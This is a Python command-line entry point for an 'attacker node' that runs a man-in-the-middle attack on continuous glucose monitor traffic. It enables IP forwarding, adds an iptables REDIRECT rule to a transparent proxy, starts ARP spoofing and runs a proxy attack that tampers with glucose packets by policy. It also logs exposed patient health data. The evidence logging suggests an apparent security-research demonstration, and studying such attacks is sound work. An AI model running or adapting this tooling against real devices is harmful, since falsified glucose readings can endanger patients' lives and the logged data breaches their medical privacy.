"""CLI entry point for the attacker node."""

from __future__ import annotations

import argparse
import json
import logging
import subprocess
import sys
from pathlib import Path

_BASE = Path(__file__).parent

from arp_spoofer import ArpSpoofer
from config import AttackerConfig
from evidence_logger import EvidenceLogger
from tamper_policy import TamperPolicy
from transparent_proxy_attack import TransparentProxyAttack

LOGGER = logging.getLogger(__name__)


def _proxy_setup(config: AttackerConfig) -> None:
    """Add the proxy REDIRECT rule."""
    iface = config.network_interface
    gw_port = config.gateway_port
    proxy_port = config.transparent_proxy_port
    cmd = [
        "iptables",
        "-t",
        "nat",
        "-A",
        "PREROUTING",
        "-i",
        iface,
        "-p",
        "tcp",
        "--dport",
        str(gw_port),
        "-j",
        "REDIRECT",
        "--to-port",
        str(proxy_port),
    ]
    LOGGER.info(
        "iptables add: iptables -t nat -A PREROUTING -i %s -p tcp --dport %d -j REDIRECT --to-port %d",
        iface,
        gw_port,
        proxy_port,
    )
    try:
        subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        LOGGER.info("proxy_redirect_rule added")
    except subprocess.CalledProcessError:
        LOGGER.error("proxy_redirect_rule add failed")


def _proxy_cleanup(config: AttackerConfig) -> None:
    """Remove the proxy REDIRECT rule."""
    cmd = [
        "iptables",
        "-t",
        "nat",
        "-D",
        "PREROUTING",
        "-i",
        config.network_interface,
        "-p",
        "tcp",
        "--dport",
        str(config.gateway_port),
        "-j",
        "REDIRECT",
        "--to-port",
        str(config.transparent_proxy_port),
    ]
    try:
        subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        LOGGER.info("proxy_redirect_rule removed")
    except subprocess.CalledProcessError:
        LOGGER.warning("proxy_redirect_rule absent or remove failed")


def _auto_setup_for_attack(config: AttackerConfig, spoofer: ArpSpoofer) -> None:
    """Prepare networking before a normal attack run."""
    # Use the explicit CLI helpers for manual setup, inspection, or cleanup
    # when debugging the attack workflow.
    spoofer.enable_ip_forwarding()
    _proxy_setup(config)


def _auto_cleanup_for_attack(config: AttackerConfig, spoofer: ArpSpoofer) -> None:
    """Restore networking after a normal attack run."""
    _proxy_cleanup(config)
    spoofer.disable_ip_forwarding()


def _parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="MITM attacker node: intercept and tamper CGM glucose packets.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python3 run_attack.py --show-config\n"
            "  python3 run_attack.py --set-config network_interface=\"wlan0\"\n"
            "  python3 run_attack.py --set-config cgm_ip=\"192.168.0.18\"\n"
            "  python3 run_attack.py --show-config  # verify placeholders were replaced\n"
            "  sudo python3 run_attack.py --setup\n"
            "  sudo python3 run_attack.py --cleanup\n"
            "  sudo python3 run_attack.py --pi-setup\n"
            "  sudo python3 run_attack.py --pi-cleanup\n"
            "  sudo python3 run_attack.py --proxy-setup\n"
            "  sudo python3 run_attack.py --proxy-cleanup\n"
            "  sudo python3 run_attack.py\n"
            "  sudo python3 run_attack.py --dry-run\n"
        ),
    )
    parser.add_argument(
        "--config",
        type=Path,
        default=_BASE / "config.json",
        help="Path to config.json (default: ./config.json)",
    )
    parser.add_argument(
        "--dry-run",
        action="store_true",
        default=False,
        help=(
            "Show planned ARP commands without executing. "
            "Does not start the proxy or sniffer."
        ),
    )
    parser.add_argument(
        "--no-arp",
        action="store_true",
        default=False,
        help=(
            "Skip ARP spoofing. Use for single-machine or loopback testing "
            "where traffic is already routed through the Pi."
        ),
    )
    parser.add_argument(
        "--pi-setup",
        action="store_true",
        default=False,
        help="Enable attacker-node IP forwarding and exit.",
    )
    parser.add_argument(
        "--pi-cleanup",
        action="store_true",
        default=False,
        help="Disable attacker-node IP forwarding and exit.",
    )
    parser.add_argument(
        "--proxy-setup",
        action="store_true",
        default=False,
        help="Add the proxy REDIRECT rule and exit.",
    )
    parser.add_argument(
        "--proxy-cleanup",
        action="store_true",
        default=False,
        help="Remove the proxy REDIRECT rule and exit.",
    )
    parser.add_argument(
        "--setup",
        action="store_true",
        default=False,
        help="Enable IP forwarding and add the proxy REDIRECT rule, then exit.",
    )
    parser.add_argument(
        "--cleanup",
        action="store_true",
        default=False,
        help="Remove the proxy REDIRECT rule and disable IP forwarding, then exit.",
    )
    parser.add_argument(
        "--show-config",
        action="store_true",
        default=False,
        help="Print the current config and exit.",
    )
    parser.add_argument(
        "--set-config",
        action="append",
        default=[],
        metavar="KEY=VALUE",
        help=(
            "Update one config field using dotted keys, then save and exit. "
            "May be passed multiple times."
        ),
    )
    return parser.parse_args()


def main() -> None:
    """Load config, initialise components, and run the selected attack mode."""
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s %(levelname)s %(name)s %(message)s",
    )

    args = _parse_args()

    try:
        config = AttackerConfig(args.config)
    except FileNotFoundError as exc:
        LOGGER.error("config_not_found path=%s error=%s", args.config, exc)
        sys.exit(1)
    except ValueError as exc:
        LOGGER.error("config_invalid error=%s", exc)
        sys.exit(1)

    if args.show_config:
        print(json.dumps(config.raw, indent=2))
        return

    if args.set_config:
        for item in args.set_config:
            if "=" not in item:
                LOGGER.error("invalid_set_config value=%s expected KEY=VALUE", item)
                sys.exit(1)
            key, value = item.split("=", 1)
            try:
                config.update_field(key, value)
            except ValueError as exc:
                LOGGER.error("config_update_failed key=%s error=%s", key, exc)
                sys.exit(1)

        try:
            config.save()
        except OSError as exc:
            LOGGER.error("config_save_failed path=%s error=%s", args.config, exc)
            sys.exit(1)

        LOGGER.info("config updated path=%s", args.config)
        return

    if args.pi_setup and args.pi_cleanup:
        LOGGER.error("choose only one of --pi-setup or --pi-cleanup")
        sys.exit(1)
    if args.proxy_setup and args.proxy_cleanup:
        LOGGER.error("choose only one of --proxy-setup or --proxy-cleanup")
        sys.exit(1)

    spoofer = ArpSpoofer(config, dry_run=args.dry_run)

    if args.setup and args.cleanup:
        LOGGER.error("choose only one of --setup or --cleanup")
        sys.exit(1)

    if args.pi_setup:
        spoofer.enable_ip_forwarding()
        LOGGER.info("pi_setup complete")
        return

    if args.pi_cleanup:
        spoofer.disable_ip_forwarding()
        LOGGER.info("pi_cleanup complete")
        return

    if args.proxy_setup:
        _proxy_setup(config)
        LOGGER.info("proxy_setup complete")
        return

    if args.proxy_cleanup:
        _proxy_cleanup(config)
        LOGGER.info("proxy_cleanup complete")
        return

    if args.setup:
        spoofer.enable_ip_forwarding()
        _proxy_setup(config)
        LOGGER.info("setup complete")
        return

    if args.cleanup:
        _proxy_cleanup(config)
        spoofer.disable_ip_forwarding()
        LOGGER.info("cleanup complete")
        return

    LOGGER.info(
        "attacker_start cgm=%s gateway=%s:%d dry_run=%s no_arp=%s",
        config.cgm_ip,
        config.gateway_ip,
        config.gateway_port,
        args.dry_run,
        args.no_arp,
    )

    policy = TamperPolicy(config.tamper_policy)
    evidence = EvidenceLogger(config)

    if not args.dry_run:
        _auto_setup_for_attack(config, spoofer)

    if not args.no_arp:
        spoofer.start()

    attack = TransparentProxyAttack(config, policy, evidence)

    try:
        if args.dry_run:
            LOGGER.info(
                "dry_run complete. Set iptables rule and run without --dry-run to start attack."
            )
        else:
            attack.start()
    except KeyboardInterrupt:
        LOGGER.info("keyboard_interrupt received, stopping attack")
    except Exception as exc:
        LOGGER.error("attack_error=%s", exc)
    finally:
        if not args.no_arp:
            spoofer.stop()
        if not args.dry_run:
            _auto_cleanup_for_attack(config, spoofer)
        evidence.stop()
        LOGGER.info(
            "attack stopped. Evidence files written:\n"
            "  packets : %s\n"
            "  phi     : %s\n"
            "  summary : %s",
            config.log_attack_packet_map,
            config.log_phi_exposure,
            config.log_attack_summary,
        )


if __name__ == "__main__":
    main()
